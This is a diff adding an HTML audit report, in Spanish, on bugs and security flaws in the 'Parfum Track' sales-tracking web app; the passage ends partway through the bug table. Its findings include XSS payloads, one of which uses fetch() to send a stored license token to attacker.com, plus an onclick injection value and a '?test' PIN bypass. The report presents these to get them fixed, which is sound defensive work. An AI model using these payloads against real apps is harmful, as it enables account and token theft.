@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Parfum Track — Auditoría Técnica Enterprise 2026</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07070f;--bg2:#0d0d1c;--bg3:#111122;--card:#161628;--card2:#1c1c32;
+  --red:#e05050;--red2:rgba(224,80,80,0.1);
+  --orange:#e08040;--orange2:rgba(224,128,64,0.1);
+  --yellow:#e0c040;--yellow2:rgba(224,192,64,0.1);
+  --green:#50c878;--green2:rgba(80,200,120,0.1);
+  --blue:#5090e0;--blue2:rgba(80,144,224,0.1);
+  --purple:#9070e0;--purple2:rgba(144,112,224,0.1);
+  --gold:#c9a84c;--gold2:#e8cc7a;--gold3:rgba(201,168,76,0.1);
+  --text:#f0ece4;--text2:#b0acbf;--text3:#6a677a;
+  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.13);
+  --radius:12px;
+}
+body{font-family:-apple-system,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;font-size:14px}
+.page{max-width:1100px;margin:0 auto;padding:32px 20px 80px}
+
+/* COVER */
+.cover{text-align:center;padding:64px 24px 48px;background:radial-gradient(ellipse 80% 50% at 50% 0%,rgba(224,80,80,0.08),transparent 70%);border-bottom:1px solid var(--border);margin-bottom:48px}
+.cover-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;border-radius:50px;background:rgba(224,80,80,0.1);border:1px solid rgba(224,80,80,0.3);font-size:12px;font-weight:700;color:var(--red);letter-spacing:1px;text-transform:uppercase;margin-bottom:24px}
+.cover h1{font-size:clamp(28px,5vw,48px);font-weight:800;line-height:1.1;margin-bottom:12px}
+.cover h1 span{color:var(--red)}
+
+/* PHASE */
+.phase{margin-bottom:56px}
+.phase-header{display:flex;align-items:center;gap:16px;padding:18px 22px;border-radius:var(--radius);background:var(--card);border:1px solid var(--border);margin-bottom:24px}
+.phase-num{width:44px;height:44px;border-radius:50%;flex-shrink:0;background:linear-gradient(135deg,var(--gold),var(--gold2));display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:800;color:#1a1a2e}
+.phase-title{font-size:18px;font-weight:700}
+.phase-subtitle{font-size:12px;color:var(--text3);margin-top:2px}
+
+/* CARDS */
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
+.card+.card{margin-top:12px}
+.card-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--text3);margin-bottom:14px}
+
+/* GRIDS */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+@media(max-width:640px){.g2,.g3{grid-template-columns:1fr}}
+
+/* BUG ITEMS */
+.bug{display:flex;gap:12px;padding:14px 16px;border-radius:10px;border:1px solid var(--border);margin-bottom:8px;font-size:13px;line-height:1.5}
+.bug-icon{font-size:15px;flex-shrink:0;margin-top:1px}
+.bug-body{flex:1}
+.bug-body strong{display:block;font-weight:600;margin-bottom:3px;font-size:14px}
+.bug-body p{color:var(--text2);margin-bottom:4px}
+.bug-meta{display:flex;gap:8px;flex-wrap:wrap;margin-top:6px}
+.bug.crit{background:rgba(224,80,80,0.08);border-color:rgba(224,80,80,0.25)}
+.bug.high{background:rgba(224,128,64,0.08);border-color:rgba(224,128,64,0.25)}
+.bug.med{background:rgba(224,192,64,0.08);border-color:rgba(224,192,64,0.25)}
+.bug.low{background:rgba(80,200,120,0.08);border-color:rgba(80,200,120,0.25)}
+
+/* TAGS */
+.tag{display:inline-flex;align-items:center;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700}
+.tag-crit{background:rgba(224,80,80,0.15);color:var(--red);border:1px solid rgba(224,80,80,0.3)}
+.tag-high{background:rgba(224,128,64,0.15);color:var(--orange);border:1px solid rgba(224,128,64,0.3)}
+.tag-med{background:rgba(224,192,64,0.15);color:var(--yellow);border:1px solid rgba(224,192,64,0.3)}
+.tag-low{background:rgba(80,200,120,0.15);color:var(--green);border:1px solid rgba(80,200,120,0.3)}
+.tag-info{background:var(--blue2);color:var(--blue);border:1px solid rgba(80,144,224,0.3)}
+
+/* CODE */
+code{font-family:'Menlo','Consolas',monospace;font-size:12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:2px 6px;color:var(--gold2)}
+pre{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:14px 16px;overflow-x:auto;font-family:'Menlo','Consolas',monospace;font-size:12px;color:var(--text2);line-height:1.6;margin:10px 0}
+pre .hi{color:var(--red)} /* highlight dangerous line */
+pre .ok{color:var(--green)} /* highlight fix */
+pre .cm{color:var(--text3)} /* comment */
+
+/* CALLOUT */
+.callout{border-radius:var(--radius);padding:14px 16px;margin:12px 0;display:flex;align-items:flex-start;gap:10px;font-size:13px}
+.callout-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.callout.danger{background:rgba(224,80,80,0.1);border:1px solid rgba(224,80,80,0.25)}
+.callout.warn{background:rgba(224,192,64,0.1);border:1px solid rgba(224,192,64,0.25)}
+.callout.info{background:rgba(80,144,224,0.1);border:1px solid rgba(80,144,224,0.25)}
+.callout.success{background:rgba(80,200,120,0.1);border:1px solid rgba(80,200,120,0.25)}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:9px 12px;background:var(--bg3);color:var(--text3);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px}
+td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--text2)}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(255,255,255,0.015)}
+td.c-ok{color:var(--green);font-weight:600}
+td.c-warn{color:var(--yellow);font-weight:600}
+td.c-bad{color:var(--red);font-weight:600}
+td.c-gold{color:var(--gold2);font-weight:600}
+
+/* CHECKLIST */
+.checklist{display:flex;flex-direction:column;gap:5px}
+.ci{display:flex;align-items:flex-start;gap:10px;padding:8px 12px;border-radius:8px;font-size:13px;border:1px solid var(--border)}
+.ci.pass{background:rgba(80,200,120,0.06);border-color:rgba(80,200,120,0.2)}
+.ci.fail{background:rgba(224,80,80,0.06);border-color:rgba(224,80,80,0.2)}
+.ci.warn{background:rgba(224,192,64,0.06);border-color:rgba(224,192,64,0.2)}
+.ci-icon{font-size:14px;flex-shrink:0;margin-top:1px}
+.ci strong{display:block;font-weight:600;font-size:13px}
+.ci p{color:var(--text2);font-size:12px;margin-top:2px}
+
+/* SCORES */
+.score-row{display:flex;align-items:center;gap:14px;padding:12px 16px;border-bottom:1px solid var(--border)}
+.score-row:last-child{border-bottom:none}
+.score-name{flex:1;font-size:13px;font-weight:600}
+.score-bar{flex:2;height:7px;background:var(--bg3);border-radius:20px;overflow:hidden}
+.score-fill{height:100%;border-radius:20px}
+.score-num{font-size:15px;font-weight:800;min-width:36px;text-align:right}
+
+/* VERDICT */
+.verdict{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:12px}
+.verdict-q{font-size:13px;color:var(--text3);font-weight:600;margin-bottom:6px}
+.verdict-a{font-size:14px;color:var(--text);line-height:1.6}
+
+/* TOC */
+.toc{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:40px}
+.toc-grid{display:grid;grid-template-columns:1fr 1fr;gap:4px}
+@media(max-width:480px){.toc-grid{grid-template-columns:1fr}}
+.toc a{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:8px;text-decoration:none;color:var(--text2);font-size:12px;transition:background .15s,color .15s}
+.toc a:hover{background:var(--gold3);color:var(--gold2)}
+.toc-n{font-size:10px;font-weight:700;color:var(--gold);min-width:18px}
+
+/* MISC */
+.section-head{font-size:14px;font-weight:700;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="cover-badge">🔴 Auditoría Enterprise · Equipo QA/CTO/Security · 2026</div>
+  <h1>Parfum Track<br><span>Auditoría Técnica Profunda</span></h1>
+  <p style="color:var(--text2);font-size:15px;max-width:580px;margin:12px auto 0;line-height:1.7">
+    Análisis exhaustivo del código real. Revisión de 7.009 líneas de index.html + functions/backup.js.<br>
+    Comportamiento como si lanzara mañana a 100.000 usuarios.
+  </p>
+  <div style="margin-top:24px;font-size:13px;color:var(--text3)">
+    📁 index.html · 7.009 líneas &nbsp;|&nbsp; 📁 landing.html · 920 líneas &nbsp;|&nbsp; 📁 functions/backup.js · 203 líneas<br>
+    ⚠️ Bugs críticos confirmados en código real: <strong style="color:var(--red)">4</strong> &nbsp;|&nbsp; Bugs altos: <strong style="color:var(--orange)">9</strong> &nbsp;|&nbsp; Medios/bajos: <strong style="color:var(--yellow)">12+</strong>
+  </div>
+</div>
+
+<div class="page">
+
+<div class="toc">
+  <div style="font-size:14px;font-weight:700;color:var(--gold2);margin-bottom:14px">Índice</div>
+  <div class="toc-grid">
+    <a href="#f1"><span class="toc-n">01</span>Auditoría funcional</a>
+    <a href="#f2"><span class="toc-n">02</span>Catálogo de bugs</a>
+    <a href="#f3"><span class="toc-n">03</span>QA extremo</a>
+    <a href="#f4"><span class="toc-n">04</span>Seguridad</a>
+    <a href="#f5"><span class="toc-n">05</span>UX/UI</a>
+    <a href="#f6"><span class="toc-n">06</span>Rendimiento</a>
+    <a href="#f7"><span class="toc-n">07</span>Escalabilidad</a>
+    <a href="#f8"><span class="toc-n">08</span>Completitud del producto</a>
+    <a href="#f9"><span class="toc-n">09</span>Checklist de producción</a>
+    <a href="#f10"><span class="toc-n">10</span>Informe final</a>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 1 — FUNCIONAL
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f1">
+  <div class="phase-header">
+    <div class="phase-num">1</div>
+    <div>
+      <div class="phase-title">Auditoría Funcional Completa</div>
+      <div class="phase-subtitle">Cada función analizada: qué hace, qué puede romperse, casos límite</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Módulo: Registro de ventas (addVenta)</div>
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>ID de venta = Date.now() — colisión posible</strong>
+        <p>Cada venta usa <code>id: Date.now()</code>. Si la función se llama dos veces en el mismo milisegundo (desktop multi-tab, botón programático o test), dos ventas tendrán el mismo ID. Las operaciones de edición y borrado buscan por ID — la segunda venta quedaría huérfana o afectaría a la primera.</p>
+        <div class="bug-meta">
+          <span class="tag tag-crit">🔴 CRÍTICO</span>
+          <span class="tag tag-info">Línea ~2684</span>
+          <span class="tag tag-info">Reproducible: 2 tabs abiertas</span>
+        </div>
+        <pre><span class="hi">ventas.unshift({id:Date.now(), ...})</span>  <span class="cm">// Date.now() puede repetirse</span>
+<span class="ok">ventas.unshift({id: crypto.randomUUID(), ...})  // FIX: UUID único garantizado</span></pre>
+      </div>
+    </div>
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>Fecha futura no bloqueada a nivel de datos</strong>
+        <p>El campo fecha tiene <code>max=todayISO()</code> en el DOM, pero si el usuario manipula el HTML (DevTools) puede enviar fecha futura. La validación del lado JavaScript verifica <code>_fTest &lt;= new Date()</code> pero usa comparación de Date objects que incluye la hora — una fecha de "hoy" tarde de noche podría fallar dependiendo de la zona horaria.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~2677</span></div>
+      </div>
+    </div>
+    <div class="bug med">
+      <span class="bug-icon">🟡</span>
+      <div class="bug-body">
+        <strong>Ganancia negativa: segundo tap tiene ventana de 5 segundos global</strong>
+        <p><code>_negGainPending</code> y <code>_negGainTimer</code> son variables globales. Si el usuario tiene dos formularios de venta abiertos simultáneamente (impossible en la UI actual pero posible con DevTools), el flag se comparte. Más importante: el timer de 5s se limpia con <code>clearTimeout</code> pero no se verifica si es el mismo contexto.</p>
+        <div class="bug-meta"><span class="tag tag-med">🟡 MEDIO</span><span class="tag tag-info">Líneas 2633-2671</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Módulo: Cuotas y cobros</div>
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>calcDebe() puede retornar negativo silenciosamente</strong>
+        <p>Si los pagos registrados superan el precio de venta (pagos extra), <code>calcDebe = Math.max(0, precioVenta - totalPagado)</code> retorna 0 correctamente. Pero <code>_estimarFechaCuota</code> y los cálculos de "cuota sugerida" usan <code>Math.ceil(debe / Math.max(1, totalC - pagadas))</code> — si <code>pagadas &gt;= totalC</code> pero hay pagos extra, el denominador puede ser 0 o negativo produciendo NaN o Infinity en pantalla.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~2524</span></div>
+      </div>
+    </div>
+    <div class="bug med">
+      <span class="bug-icon">🟡</span>
+      <div class="bug-body">
+        <strong>diasDesdeUltimoPago no maneja zonas horarias</strong>
+        <p><code>new Date(a, m-1, d)</code> construye fecha en hora local (medianoche). <code>Date.now()</code> es UTC. La diferencia puede ser ±1 día dependiendo del huso horario del usuario, causando que cuotas se clasifiquen como "urgente" o "al día" incorrectamente.</p>
+        <div class="bug-meta"><span class="tag tag-med">🟡 MEDIO</span><span class="tag tag-info">Línea ~1822</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Módulo: Backup y restauración</div>
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>_validarSchemaBackup rechaza backup con 0 ventas</strong>
+        <p>La función retorna error si <code>data.ventas.length === 0</code>: "El backup no contiene ventas". Una usuaria nueva que hace backup antes de registrar ventas (para tener el backup del perfil con gastos o stock), nunca podrá restaurar ese archivo. Error de diseño: backup ≠ ventas.</p>
+        <div class="bug-meta"><span class="tag tag-crit">🔴 CRÍTICO</span><span class="tag tag-info">Línea ~1992</span></div>
+        <pre><span class="hi">if (!data.ventas || data.ventas.length === 0) return '⚠ El backup no contiene ventas...';</span>
+<span class="ok">// FIX: no bloquear restauración de backups válidos sin ventas
+// Solo advertir, no bloquear:
+if (data.ventas?.length === 0) { /* opcional: warn en lugar de error */ }</span></pre>
+      </div>
+    </div>
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>Errores silenciosos en save() — usuario no sabe si los datos se guardaron</strong>
+        <p><code>_saveNow()</code> envuelve las escrituras en <code>try/finally</code> pero no notifica al usuario si algún <code>PTDB.set()</code> falla. En IndexedDB, los errores de escritura (disco lleno, storage bloqueado en modo privado) se resuelven silenciosamente. El usuario puede creer que guardó y no es así.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas 1667-1682</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Módulo: Stock y perfumes</div>
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>Stock negativo posible via "Agregar venta" con autoincrement</strong>
+        <p>Cuando se guarda una venta, el código hace <code>if(sp.stock &gt; 0) sp.stock--</code>. Pero si la usuaria edita el stock a 0 en un tab, y en otro tab guarda una venta del mismo perfume, el stock ya está en 0 y el decremento no se aplica — pero si está en 1, baja a 0. No hay bloqueo de stock negativo si otro proceso lo pone en -1 directamente via edición manual: <code>p.stock = parseInt(document.getElementById('edit-stock').value) || 0</code> — si el usuario pone -5, se guarda.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas 2685, 2592</span></div>
+      </div>
+    </div>
+    <div class="bug med">
+      <span class="bug-icon">🟡</span>
+      <div class="bug-body">
+        <strong>Renombrar perfume no actualiza referencias en gastos de envío</strong>
+        <p>Al renombrar un perfume en <code>guardarEdicionPerfume()</code>, el código actualiza <code>ventas.forEach(v =&gt; if v.perfume === old, rename)</code> y <code>gastos.forEach(g =&gt; rename in g.perfumesEnvio)</code>. Correcto. PERO no actualiza catSeleccionados (Set de nombres) ni las sugerencias del datalist. Las sugerencias en el formulario de nueva venta mostrarán el nombre viejo hasta recargar.</p>
+        <div class="bug-meta"><span class="tag tag-med">🟡 MEDIO</span><span class="tag tag-info">Línea ~2592</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 2 — CATÁLOGO DE BUGS
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f2">
+  <div class="phase-header">
+    <div class="phase-num">2</div>
+    <div>
+      <div class="phase-title">Catálogo de Bugs — Clasificación Completa</div>
+      <div class="phase-subtitle">Causa raíz, reproducción y solución exacta</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔴 CRÍTICOS — Bloquean funcionalidad o exponen datos</div>
+
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>BUG-01: PIN bypass via <code>?test</code> en la URL</strong>
+        <p><strong>Cómo reproducir:</strong> Abrir la app en <code>parfumtrack.pages.dev/?test</code>. El código en línea 4857 detecta <code>location.search.includes('test')</code> y llama <code>enterAppAfterPin()</code> saltando completamente el PIN.</p>
+        <p><strong>Impacto:</strong> Cualquier persona con acceso físico al celular (o que conozca la URL) puede ver todos los datos sin conocer el PIN. El PIN como capa de seguridad es inútil.</p>
+        <div class="bug-meta"><span class="tag tag-crit">🔴 CRÍTICO</span><span class="tag tag-info">Línea 4857</span></div>
+        <pre><span class="hi">if (location.search.includes('test')) { setTimeout(function(){ enterAppAfterPin(); }, 100); return; }</span>
+<span class="ok">// FIX INMEDIATO: eliminar esta línea completamente en producción
+// O restringir a localhost únicamente:
+// if (location.hostname === 'localhost' && location.search.includes('test')) { ... }</span></pre>
+      </div>
+    </div>
+
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>BUG-02: XSS via p.foto sin escapar en renderStock() y renderCatalogo()</strong>
+        <p><strong>Cómo reproducir:</strong> Restaurar un backup con <code>p.foto = "\" onerror=\"alert(document.cookie)\""</code> o editar un perfume y pegar una URL maliciosa. El código renderiza <code>&lt;img src="${p.foto}"&gt;</code> sin escapeHTML.</p>
+        <p><strong>Impacto:</strong> XSS confirmado via backup externo. Un atacante puede enviar un archivo JSON modificado y robar localStorage (licencia, email, número de WhatsApp). En renderCatalogo ya existe un <code>onerror</code> attribute que facilitaría la inyección.</p>
+        <div class="bug-meta"><span class="tag tag-crit">🔴 CRÍTICO</span><span class="tag tag-info">Líneas ~2553, ~5576</span></div>
+        <pre><span class="cm">// renderStock() — VULNERABLE</span>
+<span class="hi">const thumb=p.foto?`&lt;img src="${p.foto}" alt="" ...&gt;`:'🍶';</span>
+<span class="ok">const thumb=p.foto?`&lt;img src="${escapeHTML(p.foto)}" alt="" ...&gt;`:'🍶';  // FIX</span>
+
+<span class="cm">// renderCatalogo() — VULNERABLE (tiene onerror existente que facilita el ataque)</span>
+<span class="hi">const thumb = p.foto ? `&lt;img src="${p.foto}" alt="${p.nombre}" onerror="this.style.display='none'"&gt;` : '🍶';</span>
+<span class="ok">const thumb = p.foto ? `&lt;img src="${escapeHTML(p.foto)}" alt="${escapeHTML(p.nombre)}" onerror="this.style.display='none'"&gt;` : '🍶';  // FIX</span></pre>
+      </div>
+    </div>
+
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>BUG-03: toast() usa innerHTML — XSS secundario si nombre de perfume llega sin escapar</strong>
+        <p><strong>Cómo reproducir:</strong> En <code>guardarEdicionPerfume()</code>, la línea <code>toast(`✓ "${p.nombre}" actualizado`)</code> no usa escapeHTML. Si p.nombre contiene HTML (p.ej: <code>&lt;img src=x onerror=fetch('https://attacker.com?d='+encodeURIComponent(localStorage.getItem('pt_activated_code')))&gt;</code>), se ejecuta.</p>
+        <p><strong>Vector:</strong> Restaurar backup malicioso + ir a Stock + editar cualquier perfume. Los nombres de perfumes en VARIOS toasts no están sanitizados.</p>
+        <div class="bug-meta"><span class="tag tag-crit">🔴 CRÍTICO</span><span class="tag tag-info">Líneas 1755, 2592</span></div>
+        <pre><span class="cm">// VULNERABLE — múltiples ocurrencias:</span>
+<span class="hi">toast(`✓ "${p.nombre}" actualizado`);</span>
+<span class="hi">toast(`🍶 "${escapeHTML(p.nombre)}" eliminado del stock`, ...)</span><span class="cm"> // toastUndo sí usa escapeHTML</span>
+<span class="ok">// FIX: siempre escapar en toast() cuando incluye datos del usuario
+toast(`✓ "${escapeHTML(p.nombre)}" actualizado`);</span></pre>
+      </div>
+    </div>
+
+    <div class="bug crit">
+      <span class="bug-icon">🔴</span>
+      <div class="bug-body">
+        <strong>BUG-04: KV namespace "REEMPLAZAR_CON_ID_REAL" — rate limiting inactivo</strong>
+        <p><strong>Confirmado en código:</strong> wrangler.jsonc línea 25. El binding <code>PT_LICENSES</code> apunta a un ID placeholder. En producción, <code>env.PT_LICENSES</code> es undefined, por lo que <code>checkRateLimit()</code> retorna <code>null</code> (sin límite) en todo caso.</p>
+        <p><strong>Impacto:</strong> El endpoint <code>/backup</code> acepta requests ilimitados. Un atacante puede hacer fuerza bruta de códigos de licencia o generar DoS sin restricción.</p>
+        <div class="bug-meta"><span class="tag tag-crit">🔴 CRÍTICO</span><span class="tag tag-info">wrangler.jsonc línea 25</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">🟠 ALTOS — Degradan funcionalidad significativamente</div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-05: Eliminar mes borra ventas sin filtrar por perfil activo</strong>
+        <p>La función <code>eliminarMes(mes)</code> filtra <code>ventas = ventas.filter(v =&gt; mesKey(v.fecha) !== mes)</code>. La variable global <code>ventas</code> ya pertenece al perfil activo (cargado por <code>loadProfile</code>), así que esto es correcto. PERO si el botón de "🗑 Mes" se renderiza con interpolación directa <code>onclick="eliminarMes('${mes}')"</code>, un valor <code>mes</code> con <code>')</code> en el string podría inyectar código JS en el atributo onclick. Ejemplo malicioso: un backup con <code>fecha: "01/05'); alert(1)//"</code>.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~2454</span></div>
+        <pre><span class="hi">&lt;button onclick="eliminarMes('${mes}')"&gt;</span>
+<span class="ok">// FIX: usar data-attribute + event delegation
+&lt;button data-del-mes="${escapeHTML(mes)}"&gt;
+el.addEventListener('click', e =&gt; { const b=e.target.closest('[data-del-mes]'); if(b) eliminarMes(b.dataset.delMes); });</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-06: CDN scripts sin SRI (Subresource Integrity)</strong>
+        <p>Chart.js, jsPDF y XLSX se cargan dinámicamente desde cdnjs.cloudflare.com sin <code>integrity</code> ni <code>crossorigin</code> attributes. Si el CDN es comprometido o sufre MITM, código malicioso se ejecutaría con acceso completo a los datos del usuario (ventas, licencia, WhatsApp).</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas ~5518-5528</span></div>
+        <pre><span class="hi">const s = document.createElement('script');
+s.src = url; s.onload = resolve; s.onerror = reject;</span>
+<span class="ok">s.integrity = 'sha384-...'; // hash SRI del archivo específico
+s.crossOrigin = 'anonymous';</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-07: Backup local descarga sin confirmación de éxito</strong>
+        <p><code>backupData()</code> llama <code>a.click()</code> y luego inmediatamente <code>localStorage.setItem('pt_last_backup', Date.now())</code>. El click en el anchor para descargar puede ser bloqueado por el navegador (política de popups bloqueados, especialmente en iOS Safari). El timestamp de "último backup" se guarda aunque la descarga nunca haya ocurrido.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas ~1972-1984</span></div>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-08: IndexedDB init silencia errores — app carga sin storage</strong>
+        <p><code>PTDB.init()</code> en su <code>onerror</code> llama <code>resolve()</code> (no reject). Si IndexedDB falla (modo privado iOS, almacenamiento lleno, corrupto), la app carga con <code>PTDB.db = null</code>. Todas las operaciones de save() serán silenciosamente descartadas. El usuario registra ventas que desaparecen al cerrar la app.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~1591</span></div>
+        <pre><span class="hi">req.onerror = () =&gt; resolve(); // silencia error crítico!</span>
+<span class="ok">req.onerror = (e) =&gt; {
+  console.error('[IDB] init failed', e);
+  toast('⚠ Error de almacenamiento. Tus datos podrían no guardarse. Usá Chrome/Firefox.', 7000, 'error');
+  resolve(); // seguir cargando pero avisar al usuario
+};</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-09: Stock puede editarse a valor negativo</strong>
+        <p>En <code>guardarEdicionPerfume()</code>: <code>p.stock = parseInt(document.getElementById('edit-stock').value) || 0</code>. Si el usuario escribe "-5", <code>parseInt("-5")</code> = -5 y se guarda. El renderizador no previene stocks negativos — mostraría "Stock bajo" con número negativo.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~2592</span></div>
+        <pre><span class="hi">p.stock = parseInt(document.getElementById('edit-stock').value) || 0;</span>
+<span class="ok">p.stock = Math.max(0, parseInt(document.getElementById('edit-stock').value) || 0);</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-10: previewFotoUrl() acepta cualquier URL sin validación</strong>
+        <p>No hay validación de que la URL sea una imagen. La función solo verifica si la imagen carga con <code>img.onload</code>. URLs como <code>javascript:alert(1)</code> o <code>data:text/html,...</code> pueden ser almacenadas aunque no puedan ejecutarse directamente via <code>img src</code> en la mayoría de navegadores modernos. El vector real es el XSS confirmado en BUG-02.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Línea ~2589</span></div>
+        <pre><span class="ok">// FIX: validar URL antes de guardar
+function previewFotoUrl(forzar=false) {
+  const url = document.getElementById('edit-foto-url').value.trim();
+  if (!url) return;
+  // Solo permitir http/https
+  if (!/^https?:\/\//i.test(url)) { if(forzar) toast('⚠ Solo URLs https://'); return; }
+  // ...
+}</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-11: WhatsApp links usan window.open() — bloqueado por Safari iOS</strong>
+        <p>Todos los <code>window.open(`https://wa.me/...`)</code> son llamados en handlers async o con setTimeout. Safari iOS bloquea <code>window.open()</code> si no es llamado directamente desde un evento de usuario (sin async/timeout). Las usuarias con iPhone (mercado principal) podrían no poder enviar recordatorios de cobro.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas ~2521, ~2551</span></div>
+        <pre><span class="ok">// FIX: usar anchor con target="_blank" en lugar de window.open para iOS Safari
+const a = document.createElement('a');
+a.href = `https://wa.me/?text=${encodeURIComponent(msg)}`;
+a.target = '_blank'; a.rel = 'noopener';
+a.click();</span></pre>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-12: CSP en _headers tiene unsafe-inline y unsafe-eval</strong>
+        <p>La Content-Security-Policy incluye <code>'unsafe-inline'</code> y <code>'unsafe-eval'</code> para scripts. Esto invalida la protección CSP contra XSS. La nota en el archivo dice "necesario mientras el app sea un monolito HTML" — esto confirma que la arquitectura monolítica crea vulnerabilidades de seguridad directas.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">_headers línea 17</span></div>
+      </div>
+    </div>
+
+    <div class="bug high">
+      <span class="bug-icon">🟠</span>
+      <div class="bug-body">
+        <strong>BUG-13: Backup de nube usa token HMAC expuesto en localStorage</strong>
+        <p><code>cloudBackupSave()</code> lee <code>localStorage.getItem('pt_activated_code')</code> y lo envía como token. Este token es el HMAC-SHA256 del código, almacenado en texto plano. Si un atacante puede leer el localStorage (via XSS — ver BUG-02, BUG-03), obtiene el token permanente para acceder al backup en la nube.</p>
+        <div class="bug-meta"><span class="tag tag-high">🟠 ALTO</span><span class="tag tag-info">Líneas ~1884-1886</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">🟡 MEDIOS — Degradan experiencia o calidad</div>
+    <table>
+      <thead><tr><th>ID</th><th>Descripción</th><th>Ubicación</th><th>Impacto</th></tr></thead>
+      <tbody>
+        <tr><td>BUG-14</td><td>mesKey() retorna '' para fechas vacías → entradas "Sin fecha" en filtros</td><td>Línea ~1811</td><td class="c-warn">Medio</td></tr>
+        <tr><td>BUG-15</td><td>renderGanancias() recalcula TODOS los meses en cada render — O(n) para cada mes existente</td><td>Línea ~2536</td><td class="c-warn">Medio</td></tr>
+        <tr><td>BUG-16</td><td>Catálogo genera canvas con ctx.drawImage pero no maneja error CORS de imágenes externas</td><td>Línea ~5729+</td><td class="c-warn">Medio</td></tr>
